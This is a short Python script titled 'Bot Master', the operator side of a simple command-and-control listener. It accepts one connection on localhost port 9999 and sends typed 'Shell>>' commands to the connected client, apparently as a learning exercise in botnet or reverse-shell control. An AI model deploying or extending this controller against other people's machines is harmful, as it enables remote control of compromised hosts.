#!/usr/bin/python3
import socket

server_ip = "127.0.0.1"
server_port = 9999

# Create a socket object
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to the IP and port
server.bind((server_ip, server_port))
print(f"[+] Bot Master on listening mode {server_ip}:{server_port}")

# Set server in listening mode (accept up to 10 connections)
server.listen(10)

client, addr = server.accept()

print(f"[+] Accepted connection from: {addr}")

while True:
    # Accepting data sent from the client
    print("*****************************************************")
    command = input("Shell>> ")
    
    if command.lower() == "quit":
        break
    client.send(command.encode())
    request = client.recv(1024).decode()
    print(f"Client Response: {request}")

client.close()
server.close()
